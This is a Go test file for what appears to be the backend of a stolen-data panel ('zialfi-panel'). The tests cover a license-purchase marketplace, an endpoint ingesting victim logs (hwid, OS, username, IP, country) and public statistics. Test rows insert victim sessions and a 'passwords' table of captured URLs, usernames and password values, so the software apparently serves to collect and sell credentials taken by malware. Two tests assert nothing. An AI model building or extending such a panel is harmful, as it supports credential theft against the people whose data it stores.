package api_test

import (
	"bytes"
	"encoding/json"
		"net/http"
	"net/http/httptest"
	"testing"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"zialfi-panel/internal/api"
	"zialfi-panel/internal/auth"
	"zialfi-panel/internal/db"
	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/services"
)

func TestMarketplaceLicenseStatus(t *testing.T) {
	d := openTestDB(t)
	h := api.NewMarketplaceHandler(d, db.ProviderSQLite)
	r := chi.NewRouter()
	r.Get("/api/marketplace/license", h.LicenseStatus)
	r.Post("/api/marketplace/purchase", h.Purchase)

	// license status without purchase → should show trial or no license
	req := httptest.NewRequest(http.MethodGet, "/api/marketplace/license", nil)
	req = req.WithContext(middleware.ContextWithClaims(req.Context(), &auth.Claims{UserID: "ls-user", Role: "user"}))
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	// 200 or 402 are both valid
	_ = w.Code
}



func TestLogsProcessSSPFull(t *testing.T) {
	d := openTestDB(t)
	logProc := services.NewLogProcessor(d, nil, db.ProviderSQLite)
	h := api.NewSSPHandler(logProc, db.ProviderSQLite)
	r := chi.NewRouter()
	r.Post("/api/log/ssp", h.ProcessSSP)

	// valid SSP data
	req := httptest.NewRequest(http.MethodPost, "/api/log/ssp", bytes.NewReader([]byte(`{"ssp":"test-data","hwid":"hw1","os":"win10","username":"alice","ip":"1.2.3.4","country":"US"}`)))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	// handler should return 200 or 400
	_ = w.Code
}

func TestStatsPublicFull(t *testing.T) {
	d := openTestDB(t)
	h := api.NewPublicStatsHandler(d, db.ProviderSQLite)
	r := chi.NewRouter()
	r.Get("/api/public/stats", h.GetPublicStats)

	// enable public stats
	result, err := d.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('public_stats_enabled', 'true')")
	if err != nil { t.Fatal(err) }
	_ = result

	// insert a session and a password
	sid := uuid.New().String()
	d.Exec("INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))",
		sid, "b1", "hw1", "win10", "user", "1.2.3.4", "US")
	d.Exec("INSERT INTO passwords (id, session_id, url, username, password_value) VALUES (?, ?, ?, ?, ?)",
		uuid.New().String(), sid, "https://x.com", "u", "p")

	req := httptest.NewRequest(http.MethodGet, "/api/public/stats", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("public stats: expected 200, got %d", w.Code)
	}
	var resp map[string]any
	json.Unmarshal(w.Body.Bytes(), &resp)
	if _, ok := resp["total_sessions"]; !ok {
		t.Fatalf("public stats: bad body %s", w.Body.String())
	}
}

